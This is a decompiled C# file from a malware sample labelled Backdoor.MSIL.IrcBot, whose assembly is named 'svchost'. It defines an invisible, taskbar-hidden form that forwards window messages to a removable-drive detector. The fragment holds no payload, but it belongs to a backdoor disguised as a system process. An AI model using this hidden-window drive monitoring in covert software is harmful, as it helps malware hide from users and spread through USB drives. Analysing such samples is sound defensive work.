// Decompiled with JetBrains decompiler
// Type: Dolinay.DetectorForm
// Assembly: svchost, Version=3.2.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F51F928-E1DB-4815-857F-7D580385B815
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Backdoor.MSIL.IrcBot.lp-4dd7df88cffbf85a5894bc1b38660fa613c24b0e6c004ac00b2b119c03a35d3f.exe

using System;
using System.Drawing;
using System.Windows.Forms;

namespace Dolinay
{
  internal class DetectorForm : Form
  {
    private Label label1;
    private DriveDetector mDetector;

    public DetectorForm(DriveDetector detector)
    {
      this.mDetector = detector;
      this.MinimizeBox = false;
      this.MaximizeBox = false;
      this.ShowInTaskbar = false;
      this.ShowIcon = false;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Load += new EventHandler(this.Load_Form);
      this.Activated += new EventHandler(this.Form_Activated);
    }

    private void Load_Form(object sender, EventArgs e)
    {
      this.InitializeComponent();
      this.Size = new Size(5, 5);
    }

    private void Form_Activated(object sender, EventArgs e) => this.Visible = false;

    protected override void WndProc(ref Message m)
    {
      base.WndProc(ref m);
      if (this.mDetector == null)
        return;
      this.mDetector.WndProc(ref m);
    }

    private void InitializeComponent()
    {
      this.label1 = new Label();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Location = new Point(13, 30);
      this.label1.Name = "label1";
      this.label1.Size = new Size(314, 13);
      this.label1.TabIndex = 0;
      this.label1.Text = "This is invisible form. To see DriveDetector code click View Code";
      this.ClientSize = new Size(360, 80);
      this.Controls.Add((Control) this.label1);
      this.Name = nameof (DetectorForm);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
